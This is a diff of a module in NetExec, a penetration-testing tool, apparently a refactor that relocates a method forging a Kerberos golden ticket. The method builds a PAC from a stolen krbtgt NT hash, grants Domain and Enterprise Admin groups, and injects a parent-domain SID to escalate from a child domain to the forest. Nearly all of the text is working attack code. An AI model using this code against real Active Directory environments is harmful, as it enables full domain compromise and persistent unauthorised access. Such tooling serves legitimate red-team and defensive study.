@@ -214,6 +214,38 @@ class NXCModule:
         else:
             self.context.log.fail("Cannot forge ticket: krbtgt hash missing.")
 
+    def forge_golden_ticket(self, connection):
+        """
+        Forge a golden ticket for the child domain using the krbtgt NT-hash.
+        Supports optional USER, RID and USER_ID module options.
+        """
+        nthash = self._clean_nthash(self.krbtgt_hash)
+
+        admin_name = self.module_options.get("USER", "Administrator")
+        extra_rid = str(self.module_options.get("RID", "519"))
+        extra_sid = f"{self.parent_sid}-{extra_rid}"
+        user_rid = str(self.module_options.get("USER_ID", "500"))
+
+        domain_upper = connection.domain.upper()
+        groups_list = [513, 512, 520, 518, 519]
+
+        # Create ticket
+        enctype_value = EncryptionTypes.rc4_hmac.value
+        krbtgt_key = Key(_enctype_table[enctype_value].enctype, unhexlify(nthash))
+
+        validation_info = self._createBasicValidationInfo(admin_name, domain_upper, self.child_sid, groups_list, int(user_rid))
+        pac_infos = self._createBasicPac(validation_info, admin_name)
+        self._createRequestorInfoPac(pac_infos, self.child_sid, int(user_rid))
+
+        as_rep = self._buildAsrep(domain_upper, admin_name, enctype_value)
+        enc_asrep_part, enc_ticket_part, pac_infos = self._buildEncParts(as_rep, domain_upper, admin_name, int("87600"), enctype_value, pac_infos)
+
+        self._injectExtraSids(pac_infos, extra_sid)
+
+        encoded_asrep, client_session_key = self._signEncryptTicket(as_rep, enc_asrep_part, enc_ticket_part, pac_infos, krbtgt_key, enctype_value)
+
+        return self._saveTicket(admin_name, encoded_asrep, client_session_key)
+
     def _clean_nthash(self, raw):
         if ":" in raw:
             parts = raw.split(":")
@@ -544,39 +576,3 @@ class NXCModule:
         out_path = f"{username}.ccache"
         ccache.saveFile(out_path)
         return out_path
-
-    def forge_golden_ticket(self, connection):
-        """
-        Forge a golden ticket for the child domain using the krbtgt NT-hash.
-        Supports optional USER, RID and USER_ID module options.
-        """
-        nthash = self._clean_nthash(self.krbtgt_hash)
-
-        admin_name = self.module_options.get("USER", "Administrator")
-        extra_rid = str(self.module_options.get("RID", "519"))
-        extra_sid = f"{self.parent_sid}-{extra_rid}"
-        user_rid = str(self.module_options.get("USER_ID", "500"))
-
-        domain_upper = connection.domain.upper()
-        groups_list = [513, 512, 520, 518, 519]
-
-        enctype_value = EncryptionTypes.rc4_hmac.value
-        krbtgt_key = Key(_enctype_table[enctype_value].enctype, unhexlify(nthash))
-
-        validation_info = self._createBasicValidationInfo(admin_name, domain_upper, self.child_sid, groups_list, int(user_rid))
-        pac_infos = self._createBasicPac(validation_info, admin_name)
-
-        self._createRequestorInfoPac(pac_infos, self.child_sid, int(user_rid))
-
-        as_rep = self._buildAsrep(domain_upper, admin_name, enctype_value)
-        enc_asrep_part, enc_ticket_part, pac_infos = self._buildEncParts(
-            as_rep, domain_upper, admin_name, int("87600"), enctype_value, pac_infos
-        )
-
-        self._injectExtraSids(pac_infos, extra_sid)
-
-        encoded_asrep, client_session_key = self._signEncryptTicket(
-            as_rep, enc_asrep_part, enc_ticket_part, pac_infos, krbtgt_key, enctype_value
-        )
-
-        return self._saveTicket(admin_name, encoded_asrep, client_session_key)
